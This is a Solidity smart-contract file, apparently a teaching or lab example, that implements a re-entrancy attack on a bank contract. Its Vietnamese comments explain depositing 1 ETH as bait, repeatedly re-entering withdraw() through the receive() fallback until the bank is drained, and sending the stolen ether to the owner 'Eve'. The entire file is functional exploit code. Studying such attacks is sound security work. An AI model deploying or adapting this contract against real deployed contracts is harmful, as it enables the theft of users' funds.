// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public immutable bank;
    address public immutable owner;
    uint256 public constant UNIT = 1 ether;

    constructor(address _bank) {
        bank = IEtherBank(_bank);
        owner = msg.sender;
    }

    // 1. Nạp 1 ETH làm mồi rồi gọi withdraw() lần đầu tiên
    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value >= UNIT, "need at least 1 ETH");

        bank.deposit{value: UNIT}();
        bank.withdraw();
    }

    // 2. Nhận ETH và gọi lại withdraw() khi ngân hàng còn tiền (Re-entrancy)
    receive() external payable {
        if (address(bank).balance >= UNIT) {
            bank.withdraw();
        }
    }

    // Chuyển toàn bộ tiền cướp được về ví cá nhân của Eve
    function collect() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}